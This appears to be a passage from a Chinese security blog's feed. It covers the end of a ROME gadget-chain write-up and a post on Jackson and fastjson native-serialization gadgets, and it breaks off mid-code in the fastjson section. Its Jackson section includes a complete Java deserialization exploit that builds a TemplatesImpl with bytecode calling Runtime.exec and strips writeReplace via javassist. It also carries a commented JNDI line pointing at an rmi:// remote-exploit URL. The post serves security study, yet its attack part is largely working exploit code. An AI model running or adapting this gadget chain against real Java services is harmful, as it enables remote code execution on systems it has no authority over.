class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            outputStream.writeObject(map);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            inputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上就是 ROME 链分析的全部内容了，最后总结一下。</p><ol><li>利用说明：</li></ol><ul><li><ul><li>利用 HashMap 反序列化触发 ObjectBean 的 hashCode 方法，再触发 ObjectBean 封装的 ObjectBean 的 toString 方法，会调用。</li></ul></li></ul><ol><li>Gadget 总结：</li></ol><ul><li><ul><li>kick-off gadget：java.util.HashMap#readObject()</li><li>sink gadget：com.sun.syndication.feed.impl.ToStringBean#toString()</li><li>chain gadget：com.sun.syndication.feed.impl.ObjectBean#toString()</li></ul></li></ul><ol><li>调用链展示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">HashMap.readObject()<br>    ObjectBean.hashCode()<br>            EqualsBean.beanHashCode()<br>                    ToStringBean.toString()<br>                        TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><ol><li>依赖版本</li></ol><p>rome : 1.0</p><h3 id="偷学剑招"><a href="#偷学剑招" class="headerlink" title="偷学剑招"></a>偷学剑招</h3><p><a href="https://su18.org/post/ysoserial-su18-5/#objectbean">https://su18.org/post/ysoserial-su18-5/#objectbean</a></p><p><a href="http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/">http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/</a></p><p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/">http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jackson和fastjson原生序列化</title>
    <link href="/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><img src="138px-%E6%9C%9B%E6%9C%88%E5%89%91%E6%B3%95-%E5%A4%A7%E5%9B%BE.jpg" alt="img"></p><h2 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h2><h3 id="0x01-demo"><a href="#0x01-demo" class="headerlink" title="0x01 demo"></a>0x01 demo</h3><p>佬的文章，菜鸟的拿来主义。</p><p>链接</p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> objectMapper.writeValueAsString(message);<br><br><br>        System.out.println(<span class="hljs-string">&quot;jackon string: &quot;</span> + s);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113033842334.png" alt="image-20240113033842334"></p><p>可以看见Jackson在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-人心浮躁，本人只学剑招，瞎分析"><a href="#0x02-人心浮躁，本人只学剑招，瞎分析" class="headerlink" title="0x02. 人心浮躁，本人只学剑招，瞎分析"></a>0x02. 人心浮躁，本人只学剑招，瞎分析</h3><p>打一个断点</p><p><img src="image-20240113034938265.png" alt="image-20240113034938265"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">38</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>serializeAsField:<span class="hljs-number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)<br>serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)<br>serialize:<span class="hljs-number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)<br>_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>_writeValueAndClose:<span class="hljs-number">4568</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>writeValueAsString:<span class="hljs-number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>main:<span class="hljs-number">60</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>DefaultSerializerProvider#serializeValue</p><p><img src="image-20240113040440387.png" alt="image-20240113040440387"></p><p><img src="image-20240113040501753.png" alt="image-20240113040501753"></p><p>通过<code>findTypedValueSerializer</code>来从缓存中获取序列化器得到BeanSerializer。然后进行序列化</p><p>然后来到<code>BeanSerializer#serialize</code></p><p><img src="image-20240113041018608.png" alt="image-20240113041018608"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">BeanSerializerBase<span class="hljs-meta">#serializeFields</span><br></code></pre></td></tr></table></figure><p><img src="image-20240113041420589.png" alt="image-20240113041420589"></p><p>Bean类中的所有属性值的写入</p><p><img src="image-20240113041821522.png" alt="image-20240113041821522"></p><p>最后是能够调用对应属性值的getter方法进行赋值。</p><h3 id="0x03-构造链子"><a href="#0x03-构造链子" class="headerlink" title="0x03 构造链子"></a>0x03 构造链子</h3><p>通过上面分析，控制BeanSerializer，就可以对Bean类中的所有属性值进行getter。</p><p>writeValueAsString是jackson的反序列化入口。</p><p>所以找一个能触发writeValueAsString的就行。</p><p>com.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString</p><p><img src="image-20240113042939146.png" alt="image-20240113042939146"></p><p>com.fasterxml.jackson.databind.node.BaseJsonNode#toString</p><p><img src="image-20240113043101253.png" alt="image-20240113043101253"></p><p>所以要早一个可以序列化,然后触发BaseJsonNode#toString()。</p><p>网上的找到一个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node#POJONode<br></code></pre></td></tr></table></figure><p><img src="image-20240113043546441.png" alt="image-20240113043546441"></p><p>可以他继承ValueNode，<img src="image-20240113043613018.png" alt="image-20240113043613018"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ValueNode继承BaseJsonNode<br></code></pre></td></tr></table></figure><p>POJONode，ValueNode，都没有tostring()方法，所以POJONode.tostring会触发BaseJsonNode.tostring()</p><p>最后完成序列化触发getter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">POJONode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><h3 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>在写入序列化时会进行判断是否实现了<code>writeReplace</code>方法</p><p><img src="image-20240113044413128.png" alt="image-20240113044413128"></p><p><code>OJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p><p>我们可以通过删除这个方法来跳过这个过程，进而成功的序列化。</p><p><img src="image-20240113044543157.png" alt="image-20240113044543157"></p><p>所以使用javassist删除就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>jsonNode.removeMethod(writeReplace);<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIServer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jackson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        jdbcRowSet.getDatabaseMetaData();</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br><span class="hljs-comment">//            for (CtMethod declaredMethod : ctClass.getDeclaredMethods()) &#123;</span><br><span class="hljs-comment">//                String methodname = declaredMethod.getName();</span><br><span class="hljs-comment">//                if ((methodname.startsWith(&quot;get&quot;)))&#123;</span><br><span class="hljs-comment">//                   if (!(methodname.equals(&quot;getDatabaseMetaData&quot;)))&#123;</span><br><span class="hljs-comment">//                    CtMethod rmmethod = ctClass.getDeclaredMethod(methodname);</span><br><span class="hljs-comment">//                    ctClass.removeMethod(rmmethod);</span><br><span class="hljs-comment">//                   &#125;</span><br><span class="hljs-comment">//                &#125;</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            ctClass.toClass(classLoader,null);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><span class="hljs-comment">//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="hljs-comment">//        jdbcRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;);</span><br><span class="hljs-comment">//        POJONode node = new POJONode(jdbcRowSet);</span><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            outputStream.writeObject(hashMap);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><h3 id="0x01-demo偷学剑招"><a href="#0x01-demo偷学剑招" class="headerlink" title="0x01 demo偷学剑招"></a>0x01 demo偷学剑招</h3><p>没实力直接抄代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span 